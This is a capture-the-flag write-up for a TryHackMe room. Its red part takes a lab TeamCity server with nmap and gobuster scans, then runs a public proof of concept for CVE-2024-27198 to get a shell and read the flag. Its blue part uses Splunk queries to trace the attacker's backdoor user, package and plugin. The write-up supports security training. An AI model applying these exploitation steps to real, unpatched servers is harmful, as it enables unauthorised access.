# [THM] Red — Writeup
---

https://tryhackme.com/room/brains

**Difficulty:** Easy
**Tags:** Linux, Apache Tomcat, TeamCity, CVE-2024-27198, RCE, Splunk, SIEM, Log Analysis
**Solved:** June 2026

---

## Overview

This room is split into two parts that mirror each other: **Red** puts you in the attacker's seat exploiting a vulnerable TeamCity instance, while **Blue** puts you in the defender's seat analyzing the aftermath through Splunk logs. Together they give you both sides of the same incident — a great format for understanding how attacks look from each perspective.

---

# Part 1 — Red (Exploitation)

## Enumeration

```bash
sudo nmap -p- 10.114.134.43 -sV --min-rate=1000 -T4
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp    open  http     Apache httpd 2.4.41
39255/tcp open  java-rmi Java RMI
50000/tcp open  http     Apache Tomcat
```

Two web surfaces immediately stand out — port 80 (Apache) and port 50000 (Tomcat). Java RMI on 39255 is noted but less interesting.

### Directory Enumeration — Port 80

```bash
gobuster dir -u http://10.114.134.43:80 -w /usr/share/wordlists/dirb/common.txt
```

Nothing notable. Only `index.php` is accessible — the rest returns 403.

### Directory Enumeration — Port 50000

```bash
gobuster dir -u http://10.114.134.43:50000 -w /usr/share/wordlists/dirb/common.txt
```

`/admin` redirects to `/admin/` — this is a CI/CD dashboard. Checking the page source reveals the version:

```
Version 2023.11.3 (build 147512)
```

That version number is all we need.

---

## Exploitation — CVE-2024-27198

A quick search on that build number points directly to **CVE-2024-27198**, an authentication bypass vulnerability in JetBrains TeamCity disclosed in early 2024. It allows unauthenticated attackers to gain administrative control and execute code remotely on affected servers.

A working PoC is publicly available:
`https://github.com/W01fh4cker/CVE-2024-27198-RCE`

Install the required dependencies:

```bash
pip install faker requests urllib3
```

Run the exploit against the target:

```bash
python3 CVE-2024-27198.py -t http://10.114.134.43:50000
```

The exploit handles the authentication bypass and drops us into a shell context. From there:

```bash
cat /home/ubuntu/flag.txt
```

**Flag:** `THM{*****************************}`

---

# Part 2 — Blue (Log Analysis)

With the attack complete, we switch roles. The Blue side uses **Splunk** to reconstruct exactly what the attacker did — the same actions we just performed, now visible in the logs.

---

## Question 1 — Backdoor User

*What is the name of the backdoor user created after exploitation?*

The attacker created a new system user post-exploitation. Searching for bash shell assignments in Splunk:

```
index=* "/bin/bash"
```

This surfaces an event around **July 4, 2024** showing a new user being added to the system:

```
new user: name=********
```

**Answer:** `********`

---

## Question 2 — Malicious Package

*What is the name of the malicious-looking package installed on the server?*

Setting the time range between **July 4–8, 2024** and querying the package manager logs:

```
index=* source="/var/log/dpkg.log" "installed"
```

Among the legitimate packages, one stands out immediately:

```
status installed *************:amd64
```

A package named `*************` installed in the middle of a suspected incident window — classic attacker tradecraft, disguising a malicious binary as something that sounds like a system utility.

**Answer:** `*************:`

---

## Question 3 — Malicious Plugin

*What is the name of the plugin installed on the server after exploitation?*

Still within the July 4–8 timeframe, searching for plugin activity:

```
index=* "plugin"
```

This returns a log entry showing a plugin being uploaded to the TeamCity instance:

```
plugin_uploaded: Plugin "********" .../********.zip
```

A randomly-named plugin like `********` is a clear indicator of compromise — no legitimate plugin ships with a name like that.

**Answer:** `********`

---

## Key Takeaways

- Always version-fingerprint web applications during enumeration — a single version number here was the direct path to an unauthenticated RCE
- CVE-2024-27198 is a reminder that CI/CD platforms are high-value targets; they often run with elevated privileges and have direct access to source code and build pipelines
- On the defensive side, three artifacts made the attacker immediately visible: a new `/bin/bash` user, an oddly-named package in `dpkg.log`, and a gibberish plugin name in the TeamCity logs
- Attackers often try to blend in by naming tools after legitimate-sounding utilities, baseline awareness of what's normally installed on a system makes these stand out

---

*Tags: Linux · TryHackMe · TeamCity · CVE-2024-27198 · RCE · Splunk · SIEM · Log Analysis · CTF*